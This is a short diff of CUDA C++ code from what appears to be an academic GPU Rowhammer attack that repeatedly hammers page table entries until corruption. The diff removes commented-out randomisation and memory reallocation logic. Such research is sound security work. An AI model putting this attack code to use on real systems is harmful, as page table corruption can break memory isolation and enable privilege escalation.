@@ -112,14 +112,6 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
   /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
   /****************************************************************/
   bool found_mismatch = false;
-  // unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
-  // std::mt19937_64 rng(seed); // Mersenne Twister engine
-
-  // // 2. Define the distribution for the desired range [x, y]
-  // std::uniform_int_distribution<int> dist(0, num_alloc_post_msg);
-
-  // // 3. Generate a random number
-  // int random_num = dist(rng);
   while (!found_mismatch)
     {
       // On Failure, Re-order and try again
@@ -142,27 +134,6 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
           if (i < 8000)
             *region_ptrs[i] = 'a';
         }
-
-      // if (repeats == 0)
-      // {
-      //   std::rotate (region_ptrs, region_ptrs + num_alloc_post_msg - random_num,
-      //                region_ptrs + num_alloc_post_msg);
-      //   // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
-      //   for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
-      //   {
-      //     cudaFree (region_ptrs[i]);
-      //     cudaMallocManaged (&temp, ALLOC_SIZE);
-      //     double currentMS = time_data_access (temp, ALLOC_SIZE);
-      //     DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
-      //             << " ms" << std::endl;
-
-      //     region_ptrs[i] = temp;
-
-      //     if (i < 12000)
-      //       *region_ptrs[i] = 'a';
-      //   }
-      // }
-      // pause();
 
       gpuErrchk (cudaPeekAtLastError ());
       std::cout << "First PT Region Filled " << "Round " << repeats
